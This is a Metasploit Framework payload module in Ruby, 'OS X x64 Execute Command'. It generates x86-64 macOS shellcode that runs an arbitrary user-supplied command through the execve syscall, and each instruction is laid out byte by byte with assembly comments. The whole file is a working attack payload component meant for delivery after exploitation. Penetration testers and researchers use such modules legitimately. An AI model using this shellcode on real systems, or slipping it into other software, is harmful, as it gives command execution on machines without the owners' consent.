##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'

module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OS X x64 Execute Command',
			'Description'   => 'Execute an arbitrary command',
			'Author'        => 'argp <argp[at]census-labs.com>',
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_X86_64
		))

		# exec payload options
		register_options(
			[
				OptString.new('CMD',  [ true,  "The command string to execute" ]),
		], self.class)
	end

	# build the shellcode payload dynamically based on the user-provided CMD
	def generate
		cmd = (datastore['CMD'] || '') << "\x00"
		call = "\xe8" + [cmd.length].pack('V')
		payload =
			"\x48\x31\xc0" +                                # xor rax, rax
			"\x48\xb8\x3b\x00\x00\x02\x00\x00\x00\x00" +    # mov rax, 0x200003b (execve)
			call +                                          # call CMD.len
			cmd +                                           # CMD
			"\x48\x8b\x3c\x24" +                            # mov rdi, [rsp]
			"\x48\x31\xd2" +                                # xor rdx, rdx
			"\x52" +                                        # push rdx
			"\x57" +                                        # push rdi
			"\x48\x89\xe6" +                                # mov rsi, rsp
			"\x0f\x05"                                      # syscall
	end
end
